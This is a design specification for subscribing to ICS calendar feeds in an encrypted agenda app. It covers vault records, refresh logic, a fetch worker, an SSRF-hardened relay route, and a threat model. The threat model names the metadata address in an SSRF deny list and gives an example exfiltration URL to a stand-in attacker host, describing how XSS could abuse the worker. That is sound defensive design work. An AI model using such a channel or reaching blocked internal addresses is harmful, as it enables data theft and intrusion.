# Agenda subscriptions (ICS feed links): specification

Status: design. Nothing in this document is implemented yet. It describes what
will be built, so that code, tests, SECURITY.md/PRIVACY.md and the in-app texts
can be checked against one source.

Goal: the user pastes a `webcal://` or `https://` link to an `.ics` feed in the
Agenda, sees its events, and can refresh, rename or delete the subscription
(which deletes its events) without importing again.

Hard rules that run through every section:

- The feed link often contains a secret token. It is stored **only** inside the
  encrypted vault, and never appears in logs, error messages, analytics, toasts,
  URLs of our own pages, or the service-worker cache.
- ICS content is untrusted. It is shown as text only; nothing in it is loaded
  automatically.
- Refresh only happens while the vault is open.

## 0. What exists today (phase 1, reused as is)

Read from the code, not assumed:

| Piece | Where | Notes |
| --- | --- | --- |
| Parser | `NotesAgendaIcs.parseIcsFile(text)` in `app/static/js/agenda-ics.js` | Caps: `MAX_ICS_BYTES` (10 MB of text), `MAX_ICS_EVENTS` (10 000); rejects binary via `looksBinary`. Returns `{events, warnings}`. Each event carries `ical_uid` (or `nouid-<stableHash>` when the feed has no UID), `ics_recurrence_id`, `rrule`, `ics_exdates`, `start`, `end`, `all_day`, `source_tz`, `title`, `location`, `notes`, `attendees`, `webcall_url`. |
| Multi-file wrapper | `parseIcsEntries(entries)` | One bad entry does not stop the others. |
| Diff / preview | `diffImport(existing, parsed)` | Key is `ical_uid` or `ical_uid|ics_recurrence_id`; returns `{new, changed, unchanged}`. |
| Field stripping | `stripImportFields(rows, {description, attendees, locations})` | User choice before saving. |
| Source label | `makeSourceLabel(fileName, now)` → `"name.ics (YYYY-MM-DD)"`; `idsWithSource(events, label)` | Stored inside the encrypted event only. |
| Import | `importAgendaFromIcs(rows, {source})` in `app/static/js/store.js` | Groups rows by UID (`mergeIcsRowsForUid`: master + per-occurrence overrides keyed by RECURRENCE-ID, plus EXDATEs), reuses the existing event id when the UID is already known, skips unchanged ones. Writes into the single agenda pack (`AGENDA_PACK_UUID`, type `agenda_pack`, `events` map plus `deleted_events` tombstones). |
| Remove | `removeAgendaEvent(id)` (tombstones), `removeAgendaEventsBySource(label)` | Tombstones stop other devices from resurrecting events (`mergeAgendaPacks`, 60-day TTL). |
| UI | `importIcsFiles`, `showImportPreview` in `app/static/js/agenda.js` | File input and drag-and-drop, preview, "Import". |
| Lock | `lock()` in `store.js` zeroes the key and clears `state.items`; `isUnlocked()` reports state. | |

Known gap to fix as part of this work: `importAgendaFromIcs` matches existing
events on UID only. Its source label is a free string (name + date), which is not
a stable owner id. Subscriptions therefore get their own id field (section 2)
instead of relying on the label.

## 1. Vault record per subscription

Subscriptions live in the encrypted vault, like events. Preferred shape: a
`subscriptions` map inside the existing agenda pack (so they sync, merge and
tombstone with the same code path), not a new vault item type.

```
agenda_pack.subscriptions = {
  "<sub_id>": {
    id:               string   // uuid (newUuid()), stable for the life of the subscription
    name:             string   // user-visible, renamable; default = host-less label such as "Calendar 1"
    url:              string   // normalised https:// URL; webcal:// and webcals:// are rewritten to https://
    mode:             "direct" | "relay"
    relay_consent_at: string|null  // ISO time of the user's explicit choice; null unless mode === "relay"
    last_refresh:     string|null  // ISO time of the last successful refresh
    last_error_code:  string|null  // short code from section 6; never contains the URL or a message from the network
    created_at, updated_at: ISO strings
  }
}
agenda_pack.deleted_subscriptions = { "<sub_id>": "<ISO>" }   // tombstones, same 60-day rule
```

Rules:

- Only `https` is accepted. `http://` is refused (not upgraded). `webcal://` and
  `webcals://` are rewritten to `https://`. Userinfo (`user:pass@`) in the URL is
  refused. The default name is never derived from the URL (it may be secret).
- `mode` starts as `direct`. It becomes `relay` only after the user picks the
  relay in a dialog that says what the server will see (section 7), and then
  `relay_consent_at` is set. Switching back to `direct` clears `relay_consent_at`.
- `last_error_code` is one of the fixed codes in section 6 or `null`. No free
  text, no URL, no exception message.
- The `url` field is never copied to events, to the `source` label, to toasts,
  to `console.*`, or to any non-vault storage (localStorage, IndexedDB outside the
  encrypted vault, sessionStorage, SW caches).
- Pack merge between devices: per subscription the newer `updated_at` wins, and a
  tombstone beats an older edit, mirroring `mergeAgendaPacks`.

## 2. How events belong to a subscription

Events created by a refresh get a new field `subscription_id` (the `<sub_id>`
above) inside the encrypted event. The existing `source` label is still set (for
display) but ownership is decided by `subscription_id`, never by the label.

Identity inside a subscription is `(subscription_id, ical_uid, ics_recurrence_id)`;
the master/override grouping stays as `mergeIcsRowsForUid` does it.

Refresh = upsert + prune, one atomic pack write (a single `upsert(AGENDA_PACK_UUID, …)`):

1. Fetch the feed (section 3 or 4), parse with `parseIcsFile` (same caps, same
   `looksBinary` check). Any parse or limit error aborts the refresh; **nothing is
   changed**, and `last_error_code` is set.
2. For every parsed UID group, find the existing event with the same
   `subscription_id` and `ical_uid`. Found: update it (master fields plus
   `ics_occurrence_overrides` and `ics_exdates` rebuilt from the feed, because the
   feed is the source of truth). Not found: create it with a new id. Unchanged
   events are skipped (same signature test as `importAgendaFromIcs`).
3. Events with this `subscription_id` whose `(ical_uid)` is no longer in the feed
   are removed, via tombstones as in `removeAgendaEvent`. Overrides whose
   RECURRENCE-ID disappeared from the feed disappear with the rebuilt map.
4. A UID that already exists as a manual or file-imported event (no
   `subscription_id`, or another one) is **not** taken over: the subscription
   creates its own event. (Open choice, see section 8.)
5. Local edits to subscribed events are overwritten at the next refresh. The UI
   says so. Reminders are re-planned after the write, as the import path does.
6. An empty but valid feed removes all of the subscription's events. A feed that
   fails to parse never does.
7. Safety brake: if a refresh would delete more than half of the subscription's
   events (and more than 20), the refresh is applied only after the user confirms
   on a manual refresh, and is aborted with `E_SHRINK` on an automatic one.

Deleting a subscription (after a confirm dialog): remove the record from
`subscriptions`, write a tombstone, and tombstone every event with its
`subscription_id`, in one pack write. Pending reminders of those events are
cancelled as in `deleteEditorConfirmed`.

Renaming only changes `name` (and the `source` label is updated lazily on the next
refresh).

## 3. Direct fetch: worker contract

Direct fetch runs in a dedicated Web Worker so that the narrowest possible CSP can
apply to the one place where the browser contacts a third party.

- File: `app/static/js/ics-fetch-worker.js` (its own file, like
  `crypto-worker.js`, so it gets its own hashed name in the client manifest;
  regenerate with `scripts/build-client-manifest.py`).
- Served by its own route with its **own** response header (the worker's CSP is
  taken from the worker script's response, not from the page):

  ```
  Content-Security-Policy: default-src 'none'; connect-src https:
  ```

  Nothing else is allowed: no `script-src` beyond what a classic worker needs from
  its own origin (the exact header must be tested in a browser to confirm that
  the worker still starts; if `default-src 'none'` blocks the worker's own
  `importScripts`, the worker must not use any). `security_headers()` in
  `app/auth.py` uses `setdefault`, so the route's header is not overwritten. Also
  `X-Content-Type-Options: nosniff` and `Cache-Control` as for other scripts.
- The main page's CSP stays as it is: `connect-src 'self' …` does **not** get
  `https:`. A worker created from a same-origin script obeys the CSP of its own
  script response, which is why the wide `connect-src https:` is confined to this
  file. (To be verified per browser; see risks in section 7.)
- Messages: main → worker `{id, url}`; worker → main `{id, ok: true, text}` or
  `{id, ok: false, code}`. The worker never returns the URL, response headers or
  an exception message.
- Request: `fetch(url, { method: 'GET', credentials: 'omit', referrerPolicy:
  'no-referrer', redirect: 'follow', cache: 'no-store', mode: 'cors' })`, no
  custom headers, no body. Redirects to non-`https` are rejected by the CSP and by
  an explicit check on `response.url`.
- Limits: 2 MB (`Content-Length` is checked if present, and the stream is read
  with a running byte count and cancelled when it passes 2 MB); 10 s total via
  `AbortController`. Wrong or missing `Content-Type` is tolerated (many feeds are
  `text/plain`), but the body must pass `looksBinary` and contain `BEGIN:VCALENDAR`.
- Result handling: text goes to `parseIcsFile`; the parser caps (10 000 events)
  still apply. The 2 MB feed cap is stricter than the parser's 10 MB file cap,
  because feeds are fetched automatically.
- A CORS failure and a network failure look the same to a browser (`TypeError`).
  The worker reports `E_NETWORK_OR_CORS`; the UI then offers the relay (section 7)
  as an explicit choice, never automatically.
- The worker is created on demand when a refresh starts and terminated when it
  ends and on lock.

## 4. Relay route: API contract

Only for subscriptions with `mode === "relay"` and a recorded consent.

```
POST /api/agenda/ics-relay
Content-Type: application/json
{ "url": "https://example.invalid/feed.ics" }
```

- POST with the URL in the JSON body, never in the path or query string, so that
  it does not end up in access logs of the reverse proxy or in the browser
  history. (Response headers: `Cache-Control: no-store`, set for all `/api/`.)
- Authentication required (the existing session check; `current_user_id()` in
  `app/auth.py`). Anonymous: 401.
- Rate limit: 30 requests per hour per user, key on the user id (not on the IP),
  using `auth_rate_limit.allow(key, limit=30, window=3600)`. Over the limit: 429,
  code `E_RATE`. (Note: that limiter is in-memory per process; with several
  workers the effective limit is per worker. Document, or move to the database,
  when implemented.)
- Limits: request body ≤ 4 KB (the URL is capped at 2 048 characters); response
  body ≤ 2 MB, enforced while streaming; total time ≤ 10 s (connect + read);
  response is returned as `text/plain; charset=utf-8` with `nosniff`, status 200.
- Only `https`. Port restricted to 443 (other ports: `E_URL`).
- SSRF rules:
  1. Parse the URL; reject userinfo, non-https, non-443, empty host, IP-literal
     hosts that are not public.
  2. Resolve the host (all A/AAAA records). Reject the request if **any** resolved
     address is not globally routable: loopback, private (RFC 1918, ULA),
     link-local (incl. 169.254.169.254), CGNAT 100.64/10, multicast, reserved,
     unspecified, IPv4-mapped IPv6 of any of these, and the deployment's own
     addresses (use `ipaddress` `is_global` plus an explicit deny list).
  3. **Pin the IP**: connect to the validated address, while sending the original
     host in SNI and `Host` and validating the TLS certificate against the
     original host. No second DNS lookup between check and connect (prevents DNS
     rebinding).
  4. Redirects are followed manually, at most 3. After every redirect the whole
     procedure (steps 1-3) runs again on the new URL. A redirect to `http`, to
     another port, or to a non-public address ends the request with
     `E_REDIRECT`/`E_BLOCKED`.
  5. No cookies, no `Authorization` forwarded, a fixed generic `User-Agent`
     that names no site and no user, no proxy environment variables used.
- No storage, no logging: the URL and the body are not written to the database,
  disk, cache, application log, exception logs or metrics. Handler code must catch
  all exceptions itself and answer through a helper that emits only a code (like
  `_generic_client_error`, but without `log.exception`, since tracebacks from HTTP
  libraries contain the URL). The web server's access log must not record request
  bodies (default). Rate-limit bookkeeping keeps only the user id and timestamps.
- Errors: `{ "error": "<code>" }` with HTTP status; the code is from the fixed
  list in section 6. The response never echoes the URL, the resolved IP, the
  upstream status text or any upstream body.

## 5. When refresh runs

- Only while the vault is open (`isUnlocked()`). The URL is only readable then, so
  a locked vault cannot refresh, by construction. There is no background sync, no
  service-worker fetch, no push.
- Triggers: manual "Refresh" (any time, one at a time per subscription), and
  automatic refresh when the Agenda is open and the vault is unlocked: on unlock
  / opening the Agenda if `now - last_refresh ≥ 30 minutes`, and then by a timer
  every 30 minutes at most. A failed automatic refresh is not retried sooner than
  the 30-minute interval (no tight retry loops against a provider or the relay).
- The 30-minute minimum applies to automatic refreshes, not to a manual one, but a
  manual refresh is still bound by the relay rate limit.
- On `lock()` (and logout): all refresh timers are cleared, any in-flight fetch
  is aborted, the fetch worker is terminated, and a late response is dropped
  (check `state.lockEpoch` before writing, as the store does elsewhere).
- Multiple devices each refresh on their own; results merge through the normal
  pack merge. This can cause two fetches per interval for a user with two devices.
  That is accepted.

## 6. Error codes

Fixed set, safe to show and to store in `last_error_code`:

| Code | Meaning |
| --- | --- |
| `E_URL` | Not a valid https feed URL (scheme, port, userinfo, length). |
| `E_NETWORK_OR_CORS` | Direct fetch failed; cause unknown to the browser. Triggers the relay offer. |
| `E_TIMEOUT` | Over 10 s. |
| `E_TOO_LARGE` | Over 2 MB. |
| `E_NOT_ICS` | Binary or no `BEGIN:VCALENDAR`. |
| `E_PARSE` | Parser limit or error (`MAX_ICS_EVENTS`, etc.). |
| `E_UPSTREAM` | Provider answered with a non-2xx status. The status text is not passed on. |
| `E_BLOCKED` | Relay only: address not allowed (SSRF rules). |
| `E_REDIRECT` | More than 3 redirects, or a redirect to something not allowed. |
| `E_RATE` | Relay rate limit (HTTP 429). |
| `E_AUTH` | Relay only: not signed in (HTTP 401). |
| `E_SHRINK` | Automatic refresh refused because it would delete most events. |

## 7. Threat model and honest trade-offs

What is protected: the link and the events are stored only as vault ciphertext;
the server stores no link, no feed content and no refresh history in the direct
mode.

What each mode exposes:

- **Direct**: no Deeperguard server is involved. The calendar provider sees the
  user's IP address, the time of each request, and the user agent, and knows the
  link's token was used. A provider that mints one token per subscriber can tell
  that the user polls the feed (every 30 minutes at most while the app is open).
  Many providers do not allow this (CORS); that is why the relay exists.
- **Relay** (opt-in per subscription, after an explicit dialog): the server sees
  the link **and** the decrypted feed content while it fetches and passes it
  along, and the provider sees the server's IP, not the user's. This is an
  exception to "the server only sees ciphertext". The server does not store or log
  the link or content, but the user must trust that this holds; it cannot be
  verified from the browser. The dialog states this in plain words, and the
  consent time is recorded in the vault record. The relay is only offered after a
  direct attempt failed, or when the user picks it.
- A compromise of the server in relay mode exposes the links and contents that
  pass through it while the compromise lasts (not past ones, since nothing is
  stored).

Attackers and what the design does about them:

- **Malicious feed content** (ICS is untrusted): shown as text (`textContent`);
  existing caps on size, event count and recurrence expansion; `webcall_url` is
  already filtered through `sanitizeHttpsUrl` and is only a link the user clicks;
  no `ATTACH`, `IMAGE`, `CONFERENCE` or other URL is fetched automatically.
- **Malicious or hostile URL pointing at our network** (SSRF): section 4. The
  direct mode cannot do SSRF against the server's network, but the user's browser
  can be pointed at the user's own LAN by a feed link (`https://` to a private
  host the browser can reach). The worker's fetch is a blind GET with no
  credentials, and the result is parsed as ICS, so the impact is low; a block on
  private-looking hosts in the UI is advisable but cannot be complete (DNS).
- **Resource exhaustion**: 2 MB, 10 s, 10 000 events, 30/h per user on the relay,
  30-minute minimum between automatic refreshes.
- **XSS in the app**: this design adds a deliberate hole. The worker is allowed to
  connect to any `https:` host, so an attacker who can run script in the app
  origin (XSS) can post a message to that worker, or start their own copy of it,
  and use it as a covert channel to exfiltrate data via the URL it fetches
  (`https://attacker.example/?d=…`), even though the page's own `connect-src` is
  narrow. This is an honest weakening of the CSP-based exfiltration barrier. A
  worker with no URL restriction cannot be fully fixed within CSP.
  Mitigations: the worker is a separate file with no other capabilities (no
  access to the vault or DOM); it only accepts messages shaped `{id, url}` and
  rejects URLs longer than 2 048 characters (limits the bandwidth per call);
  it is created only for the duration of a refresh. A user who cannot accept this
  risk can leave the feature unused: with no subscriptions, the worker is never
  started. An alternative is to route all fetches through the relay and keep the
  page CSP narrow, at the price of the relay seeing everything; we do not choose
  that, because it weakens the main privacy promise for every user. This choice is
  documented in SECURITY.md.
- **Token leakage via our own surfaces**: `url` is in the vault only. Tests must
  check that it never appears in logs (server and client), thrown error messages,
  toasts, `last_error_code`, the `source` label, the manifest, or any request to
  our own server in direct mode. Referrer is suppressed (`no-referrer`).
- **Redirect to attacker or provider-side token leak**: a feed server may
  redirect; the final URL is not stored and not shown.
- **Lock/unlock races**: late responses after lock are dropped (section 5).

Not protected / not claimed:

- A provider can still link requests to the user by token and IP.
- The relay cannot prove it is not logging.
- Anything in a subscribed feed that the user then edits locally is lost at the
  next refresh.

## 8. Open choices for the implementer

1. A subscription UID that collides with a manually imported event: this spec
   keeps them separate. Alternative: adopt the existing event. Pick one and test it.
2. Whether `subscriptions` lives in the agenda pack (preferred; sync for free) or in
   its own vault item. If the pack: bump `version` handling in
   `mergeAgendaPacks` so old clients do not drop unknown keys. Check what an older
   client does with the extra fields.
3. Rate-limit store: the in-memory limiter in `app/auth_rate_limit.py` is per
   process. Accept or persist.
4. The exact CSP for the worker response must be verified in Chromium, Firefox and
   Safari/iOS before relying on it; this spec records the target, not a tested
   result.

## 9. Tests to write with the implementation

Use fake hosts only (`example.invalid`, `feed.test`) and obvious fake tokens; never
a real link or token.

- Parser reuse: a feed refresh goes through `parseIcsFile`; UID +
  RECURRENCE-ID grouping, EXDATE rebuild, no-UID feed, caps (events, bytes,
  binary) leave existing data untouched.
- Upsert/prune: changed, unchanged, new, removed events; override removed from the
  feed; empty valid feed; parse failure changes nothing; `E_SHRINK`.
- Ownership: `subscription_id` set; manual events with the same UID untouched;
  deleting a subscription removes only its events and writes tombstones.
- Record: `webcal(s)://` → `https://`; `http://` and userinfo refused;
  `last_error_code` only from the fixed set; no URL in any stored field other
  than `url`.
- Worker: source of the worker file uses `method: 'GET'`, `credentials: 'omit'`,
  `referrerPolicy: 'no-referrer'`, 2 MB and 10 s; the route's CSP header equals the
  target; the page CSP has no `https:` in `connect-src`.
- Relay: 401 anonymous; 429 after 30 per hour per user; body URL not in query;
  SSRF table (loopback, RFC 1918, link-local/metadata, CGNAT, IPv6 ULA, IPv4-mapped,
  non-443, userinfo, `http`); a hostname resolving to one public and one private
  address is refused; DNS rebinding (second lookup gives a private address) is not
  reachable because the IP is pinned; redirect to a private host is blocked; fourth
  redirect fails; 2 MB and 10 s enforced; error bodies contain no URL.
- No logging: with log capture at DEBUG, a relay call (success and every error path)
  and a client refresh leave no log record containing the URL, its host, its token
  or the feed body.
- Scheduler: no automatic refresh while locked; interval ≥ 30 minutes; `lock()`
  clears timers, aborts fetches and drops late responses.
- UI texts: consent dialog, subscription label and error messages match sections
  4, 6 and 7, and PRIVACY.md/SECURITY.md say the same.
